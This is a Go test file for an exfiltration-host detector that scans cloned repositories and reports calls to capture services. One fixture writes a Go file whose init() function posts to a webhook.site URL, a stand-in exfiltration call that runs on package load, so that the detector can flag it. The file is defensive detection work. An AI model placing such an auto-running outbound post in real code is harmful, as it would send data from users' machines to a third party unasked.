package exfilwatch_test

import (
	"context"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/sarahmaeve/signatory/internal/profile"
	"github.com/sarahmaeve/signatory/internal/signal/exfilwatch"
)

func TestCollector_Name(t *testing.T) {
	t.Parallel()
	c := exfilwatch.NewCollector("")
	assert.Equal(t, "exfilwatch", c.Name())
}

// TestCollector_EmptyPath_ReturnsErrNoClone — fail-loudly contract,
// matching repofiles. By the time Collect runs, resolveClonePath
// upstream has either resolved a real clone or errored; an empty
// path here is a programming bug, not a normal absence.
func TestCollector_EmptyPath_ReturnsErrNoClone(t *testing.T) {
	t.Parallel()
	c := exfilwatch.NewCollector("")
	_, err := c.Collect(context.Background(), &profile.Entity{ID: "e1"})
	require.Error(t, err)
	assert.True(t, errors.Is(err, exfilwatch.ErrNoClone),
		"want ErrNoClone, got %v", err)
}

func TestCollector_NonexistentPath_ReturnsErrNoClone(t *testing.T) {
	t.Parallel()
	c := exfilwatch.NewCollector("/this/path/does/not/exist/exfil")
	_, err := c.Collect(context.Background(), &profile.Entity{ID: "e1"})
	require.Error(t, err)
	assert.True(t, errors.Is(err, exfilwatch.ErrNoClone),
		"want ErrNoClone, got %v", err)
}

// TestCollector_CleanTree_EmitsEmptySignal — a clean clone still
// emits the signal; the value is an empty hit list. Empty is a
// positive observation, not silence.
func TestCollector_CleanTree_EmitsEmptySignal(t *testing.T) {
	t.Parallel()

	root := t.TempDir()
	require.NoError(t, os.WriteFile(filepath.Join(root, "main.go"),
		[]byte("package main\nfunc main() {}\n"), 0o644))

	c := exfilwatch.NewCollector(root)
	result, err := c.Collect(context.Background(), &profile.Entity{ID: "repo:github/test/repo"})
	require.NoError(t, err)
	require.NotNil(t, result)
	require.Len(t, result.Collected, 1, "must emit exactly one signal")

	soa := result.Collected[0]
	require.False(t, soa.IsAbsence(), "clean tree must emit a signal, not an absence")

	sig := soa.ToSignal()
	assert.Equal(t, "exfil_capture_host", sig.Type)
	assert.Equal(t, "exfilwatch", sig.Source)
	assert.Equal(t, profile.SignalGroupPublication, sig.Group)
	assert.Equal(t, profile.ForgeryHigh, sig.ForgeryResistance)
	assert.Equal(t, "repo:github/test/repo", sig.EntityID)

	var hits []exfilwatch.Hit
	require.NoError(t, json.Unmarshal(sig.Value, &hits))
	assert.Empty(t, hits)
}

// TestCollector_DirtyTree_EmitsHits — webhook.site in init.go fires
// the signal. JSON unmarshal of the value matches the Hit shape.
func TestCollector_DirtyTree_EmitsHits(t *testing.T) {
	t.Parallel()

	root := t.TempDir()
	content := "package x\nfunc init() { post(\"https://webhook.site/abc\") }\n"
	require.NoError(t, os.WriteFile(filepath.Join(root, "init.go"),
		[]byte(content), 0o644))

	c := exfilwatch.NewCollector(root)
	result, err := c.Collect(context.Background(), &profile.Entity{ID: "e1"})
	require.NoError(t, err)
	require.Len(t, result.Collected, 1)

	sig := result.Collected[0].ToSignal()
	var hits []exfilwatch.Hit
	require.NoError(t, json.Unmarshal(sig.Value, &hits))

	require.Len(t, hits, 1)
	assert.Equal(t, "webhook.site", hits[0].Host)
	assert.Equal(t, "init.go", hits[0].File)
	assert.Equal(t, 2, hits[0].Line)
}

func TestCollector_NilEntity_ReturnsEmptyResult(t *testing.T) {
	t.Parallel()

	root := t.TempDir()
	c := exfilwatch.NewCollector(root)
	result, err := c.Collect(context.Background(), nil)
	require.NoError(t, err)
	require.NotNil(t, result)
	assert.Empty(t, result.Collected,
		"nil entity should produce an empty result, not panic")
}
